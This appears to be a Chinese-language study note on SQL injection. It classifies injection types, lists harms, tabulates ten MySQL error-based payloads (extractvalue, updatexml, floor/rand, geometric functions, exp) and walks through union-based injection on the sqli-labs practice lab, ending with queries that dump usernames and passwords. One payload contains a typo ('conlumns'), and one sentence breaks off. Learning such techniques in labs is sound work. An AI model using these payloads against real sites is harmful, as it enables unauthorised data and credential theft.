
**注入过程**
![[Pasted image 20251130151741.png]]
# 1 分类
按照最常见的分类：联合查询注入、报错注入、布尔盲注、时间盲注(延时盲注)； 除此之外还有比如HTTP头注入、堆叠注入、宽字节注入、二次注入(又叫二阶注入)，还有DNSlog注入 请求头的注入：user-agent；referer；cookie；Host；Location；Accept-Languag

其实我认为，sql注入按大体上分就是两类，数字型和字符型，这个是按照所传参数类型做的区分，上面提到的各种类型只不过是这两种的不同展现形式或者注入的位置不同罢了。

# 1 注入点判断
- `?id=1 and 1=1`和`?id=1 and 1=2`进行测试，如果

# 1 漏洞概述
SQL注入漏洞是服务器在处理SQL语句是错误地拼接用户提交参数，打破了原有的SQL执行逻辑，导致攻击者可部分或完全掌握SQL语句执行效果的一类安全问题
SQL注入漏洞是一类与数据库密不可分的漏洞。由于网站和用户至今的交互只要体现在用户提交的参数上，网站会根据用户提交的参数进行一定的个数据库查询、修改、删除、新增等处理，这就给攻击者带来一些可乘之机。攻击者通过在原有的数据库执行语句中，通过引入闭合符号保证原有语法正确，并且引入带有新逻辑的查询语句加以执行，就可以实现“额外”的查询效果。这个“额外”往往是超出网站设计者考虑范围的，如果查询的数据是管理员的密码又或者是网站订单签名的私钥，就会引发更大的安全问题。

sql 注入真正的威胁来自于欺骗。这个欺骗体现在以下两点
	1.攻击者欺骗服务器，是服务器以为自己是普通用户
	2.攻击者提交恶意的参数欺骗服务器，让服务器以为是正常的参数
**一切用户输入都有可能是有害的**
# 2 漏洞危害
- 数据库信息泄露：数据库中存放的用户的隐私信息的泄露
- 网页篡改：通过数据库对特定网页进行篡改
- 网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马连接，进行挂马攻击
- 数据库被恶意操作：数据库服务器被攻击，数据库的系统挂你员账号被篡改
- 服务器被远程控制，备案转后门：经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统
# 3 分类
从挖掘技巧上来划分有报错注入、union注入、布尔注入、时间注入、dns查询注入
从SQL注入参数（注点）在http请求中的位置来划分有GET注入、POST注入、Cookie注入、Referer注入、User-Agent注入等；
等等各种
还有因对抗**转义机制**而产生的宽字节注入、二次注入等，从测试SQL注入的会先不同来划分有显注、盲注、二阶注入
# 4 SQL注入检测方法与攻击方法
## 4.1 报错注入（Error-Based SQL Injection）
报错注入既是一种SQL注入检测方法，同时也是利用SQL注入读取数据的方法。
### 4.1.1 基于报错的sql注入检测方法
作为检测方法，攻击者在判断一个参数是否存在sql注入漏洞时，会尝试拼接单引号、反斜杠字符。例如`id=1'`
这样的字符如果被拼接传入sql 语句中会变成如下情况。
```sql
select * from post_log where id=1'
```
于是引起一个sql语法错误，数据库引擎会抛出错误，根据不同的开发模式，有些网站会将错误信息直接打印在网站上。
如果发生了这样的报错，证明攻击者拼接的单引号起作用了。这个位置是具有sql注入漏洞。同理，如果反斜杠也是sql语句中的一个特殊字符。作为转义符，他会转移后面的字符内容。例如：
```sql
select * from post_log where id='1\'
```
原本正常闭合的单引号被转义符打破了，最后形成了一个未闭合的语句。
在AWV扫描器中，还有这样一种基于报错的检测规则：“select 92223372036854775807+1”。当MySQL执行的数学运算产生的结果，造成整数溢出，会报出异常。根据页面是否返回该异常，可以判断sql语句是否执行成功。但是，并不是所有存在整形一处报错的位置都是存在sql注入漏洞的。因此，该检测规则仅作为低风险的提示，而无法直接检测某一个位置是否存在sql注入漏洞。
### 4.1.2 基于报错的sql注入攻击
报错注入还可以用来发起攻击。在一些场景下，通过报错会将目标数据打印在网页上。
MySQL报错注入是一种利用数据库错误信息来获取数据的技巧，当你无法直接看到查询结果，但页面会返回SQL错误信息时，它就可能派上用场。

以下是十种经典的MySQL报错注入方法，可以帮助理解其原理和应用场景

|注入方法类别|核心原理|关键函数/示例|适用版本/限制|
|---|---|---|---|
|**1. floor() 报错**​|利用 `count()`、`group by`与伪随机数 `floor(rand(0)*2)`在分组时产生的主键重复冲突。|`select 1 from (select count(*),concat((payload), floor(rand(0)*2))x from information_schema.tables group by x)a`|需保证操作的表至少有3条记录。|
|**2. extractvalue() 报错**​|向函数注入不符合XPath格式的字符串，导致报错并回显信息。|`and extractvalue(1, concat(0x7e,(select user()),0x7e))`|MySQL > 5.1.5；最多返回32字符。|
|**3. updatexml() 报错**​|原理同 `extractvalue()`，利用XPath格式错误报错。|`and updatexml(1,concat(0x7e,(select user()),0x7e),1)`|MySQL > 5.1.5；最多返回32字符。|
|**4. geometrycollection() 报错**​|几何空间函数预期接收特定格式数据，传入非法值引发错误。|`and geometrycollection((select * from(select * from(select user())a)b))`|对参数格式要求严格。|
|**5. multipoint() 报错**​|同属几何空间函数，利用参数格式验证报错。|`and multipoint((select * from(select * from(select user())a)b))`|同属几何空间函数系列。|
|**6. polygon() 报错**​|同属几何空间函数，利用参数格式验证报错。|`and polygon((select * from(select * from(select user())a)b))`|同属几何空间函数系列。|
|**7. multipolygon() 报错**​|同属几何空间函数，利用参数格式验证报错。|`and multipolygon((select * from(select * from(select user())a)b))`|同属几何空间函数系列。|
|**8. linestring() 报错**​|同属几何空间函数，利用参数格式验证报错。|`and linestring((select * from(select * from(select user())a)b))`|同属几何空间函数系列。|
|**9. multilinestring() 报错**​|同属几何空间函数，利用参数格式验证报错。|`and multilinestring((select * from(select * from(select user())a)b))`|同属几何空间函数系列。|
|**10. exp() 报错**​|传入较大值（如`~0`）导致指数函数 `exp()`计算溢出。|`and exp(~(select * from(select user())a))`|MySQL 5.5.53前有效。|

 使用报错注入读取数据的优点是发送请求数量少、数据获取直观，不受网络波动等其他因素干扰。所以在大多数场景下，报错注入被优先考虑使用。
 报错注入对数据库类型和版本依赖度强。

这里利用sqli-labs



## 4.2 union注入 （Union-Based SQL Injection)

联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化
这里利用sqli-labs第一关为例
1.注入点判断
开始判断是否存在注入，输入`?id=1'`页面发生报错，说明后端对前端的输入没有很好的过滤，产生了sql注入漏洞
![[Pasted image 20251217150642.png]]
继续判断，输入 `?id=1’ and 1=1 --+` 页面正常显示
![[Pasted image 20251217150859.png]]
确定了此处是单引号闭合的
页面根据输入的数据变化而变化，当存在注入点时，优先考虑使用联合注入
2.判断当前表的字段个数
因为当前页面的查询实现就是一个select查询语句，要使用union，必须保证后面的select查询的列数和前面的统一一致
使用`order by`来进行判断
```sql
?id=1' order by 3 --+
```
![[Pasted image 20251217151257.png]]
```sql
?id=1' order by 4 --+
```
![[Pasted image 20251217151322.png]]
确定列数为3
3.判断回显位
以下为union注入中较为常用的一些函数和环境变量
![[Pasted image 20251217151444.png]]
接下来测试我们的输入会在屏幕哪个地方进行回显。上面我们判断出来了表中有3列，所以union select的时候就写xx,xx,xx三个数据

需让union select前面的参数查不出来而回显后面的语句，所以id=-1’

`?id=-1' union select 1,2,3 --+ `
**这里将前面的id改为-1，是为了让前面的查询语句查询不到对应信息，让我们后面的查询可以不被前一句的信息覆盖**

如下，在name和password值中回显了我们的输入，这时我们就可以在回显2或3的放置放入测试语句。
![[Pasted image 20251217151555.png]]
![[Pasted image 20251217151759.png]]
后面就是这几句了,因为你这个数据库下面是有好几个表的，所以这里查询到的表名也不止一个，这里只会回显第一个，所以我们要使用`group_concat()`来将查询到的表名连接起来，让它们一起显现
```sql
?id=1' union select 1,2,database() --+
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
?id=-1' union select 1,2,group_concat(column_name) from information_schema.conlumns where table_schema=database() and table_name='users' --+
?id=-1' union select 1,2,group_concat(id,username,password) from users --+
```
